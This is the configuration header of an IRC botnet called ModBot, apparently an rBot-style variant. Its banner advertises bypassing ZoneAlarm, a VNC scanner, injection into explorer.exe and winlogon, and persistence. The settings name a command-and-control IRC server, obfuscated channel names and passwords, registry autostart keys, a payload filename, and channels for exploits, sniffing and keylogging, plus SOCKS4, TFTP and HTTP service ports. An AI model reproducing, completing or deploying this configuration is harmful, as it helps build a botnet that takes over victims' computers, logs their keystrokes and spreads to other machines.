//////////////////////////////////////////////////
//            120|-[ModBot]-                    // 
//  Quick-Mod By t0nix. Bypasses ZoneAlarm      //
//  and has modded VNC Scanner  and injects into//
//  explorer.exe and winlogin.exe and persist   //
////////////////////////////////////////////////// 
// NICK SETTINGS

BOOL nickprefix = TRUE;
BOOL topiccmd = TRUE;
BOOL rndfilename = FALSE;
BOOL AutoStart = TRUE;
BOOL _inject = 1; // Want to inject? 1 = yes 0 = no
int nicktype = FUNKYNICK;
int port = 5667;
int port2 = 6667;
int maxrand = 4;
int tftpport = 69;
int httpport = 2006;
int socks4port = 8559;
unsigned short bindport = 3169;	
char prefix = '.';

#ifndef NO_CRYPT

// Bot Config

char nickconst[] = "\x7F\x54\xB9\x79\x56";
char password[] = "";
char botid[] = "\x57\x59\x99\x4F\x08\x97\xB4\x3A\xEE\x79\x1D\xC1";
char version[] = "\x77\x47\x95\x4A\x10\xCF\x8C\x1C\xF2\x68\x3C\xC5\x5A\x59\x82\x9B\xD2\x8E\x6A\xCB\x80\x88\xBC\x69\xF9";
char modeonconn[] = "\x0F\x54";
char chanmode[] = "\x0F\x5F\x97\x4A\x0F\x92";

char *authost[] = {
	"*@host.com"
};

char *versionlist[] = {
	"\x6D\x41\x9F\x04\x3A\xC2\x91\x24\xFE\x67\x5E\xFF\x0E\x46\xC0\xBC\x92\xAE\x68\xC3\x8D\x97\xE1\x22\xED\x1D\xBE\x83\x9D\x31\x45\xF3\xD6\x99\xC1\xBF\x98\xB8\xA6\xF6\x25\xB9"
};

// File Name Shit

char filename[] = "\x4F\x40\x9B\x57\x08\xCC\xB2\x29\xF8";
char szLocalPayloadFile[]="\x57\x55\x89\x47\x14\x8C\xB1\x38\xFA\x22\x1A\xCB\x5A";
char logfile[]="\x47\x16\xA6\x78\x08\x9B\xA4\x25\xF8\x61\x50\xCE\x4F\x70";

// Reg Settings

char valuename[] = "\x73\x45\x94\x40\x14\x95\xA4\x71\xD6\x60\x1F\xD9\x5D\x24\xE3\xA7\xDE\x8B\x63\xD5";
char regkey1[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93";
char regkey2[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93\xA8\x34\xC2\x71\xDD\xFE\x98\xC9";
char regkey3[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x91\xC0\x02";
char regkey4[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x3F\xF9\x7E\x76\xC0\xBC\xDA\x8C\x72";

// Server Settings

char server[] = "irc.lol-wut.net";
char serverpass[] = "";
char server2[] = "";

// Channel Settings
//VNC channel has to be the same as main channel
char channel[] = "\x07\x1D\xC8\x14\x58";
char chanpass[] = "\x42\x49\x98\x10\x0F\x8A";
char channel2[] = "\x07\x1D\xC8\x14\x4A\xD0\xE7";
char chanpass2[] = "";
char exploitchan[] = "\x07\x1D\xC8\x14\x58";
char patchchan[] = "\x07\x1D\xC8\x14\x58";
char sniffchan[] = "\x07\x1D\xC8\x14\x58";
char keylogchan[] = "\x07\x1D\xC8\x14\x58";
char vncchan[] = "\x07\x1D\xC8\x14\x58";
char keylogfile[] = "\x4F\x47\xD4\x48\x14\x85";

#endif

char mn_title[]		= "[Main]-";
char sc_title[]		= "[Scan]-";
char rt_title[]		= "[r00t]-";